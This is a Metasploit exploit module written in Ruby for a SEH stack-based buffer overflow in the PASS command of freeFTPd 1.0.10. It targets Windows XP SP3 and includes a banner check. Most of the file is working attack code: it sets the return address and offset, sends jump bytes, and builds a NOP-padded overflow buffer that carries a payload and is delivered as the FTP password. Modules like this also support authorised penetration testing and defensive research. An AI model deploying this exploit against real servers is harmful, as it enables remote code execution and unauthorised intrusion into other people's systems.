##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'freeFTPd 1.0.10 PASS Command SEH Overflow',
            'Description'    => %q{
                    This module exploits a SEH stack-based buffer overflow in freeFTPd Server PASS command version 1.0.10.
                credit goes to Wireghoul.
 
            },
            'Author'         =>
                [
                    'Wireghoul - www.justanotherhacker.com', # original poc
                    'Muhamad Fadzil Ramli <fadzil [at] motivsolution.asia>', # metasploit module
                ],
            'License'        => MSF_LICENSE,
            'References'     =>
                [
                    [ 'OSVDB', '96517' ],
                    [ 'EDB', '27747' ]
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh'
                },
            'Privileged'     => false,
            'Payload'        =>
                {
                    'Space'    => 600,
                    'BadChars' => "\x00\x20\x0a\x0d",
                    #'DisableNops' => true
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'Windows XP English SP3',   { 'Ret' => 0x00414226 , 'Offset' => 952 } ],
                ],
            'DisclosureDate' => 'Aug 21 2013',
            'DefaultTarget' => 0))
    end
 
    def check
        connect
        disconnect
 
        if (banner =~ /freeFTPd 1.0/)
            return Exploit::CheckCode::Vulnerable
        end
        Exploit::CheckCode::Safe
    end
 
    def exploit
        connect
 
        payload_size = payload.encoded.length
 
        buf = make_nops(1000)
        buf[(target['Offset']-11) - payload_size, payload_size] = payload.encoded
        buf[target['Offset']-5,5] = "\xe9\x98\xfe\xff\xff"
        buf[target['Offset'],4]   = [0xfffff9eb].pack("V")
        buf[target['Offset']+4,4] = [target.ret].pack("V")
 
        print_status("Sending exploit buffer...")
 
        #buffer = Rex::Text.pattern_create(1000)
        send_user(datastore['FTPUSER'])
        send_pass(buf)
 
        handler
        disconnect
    end
 
end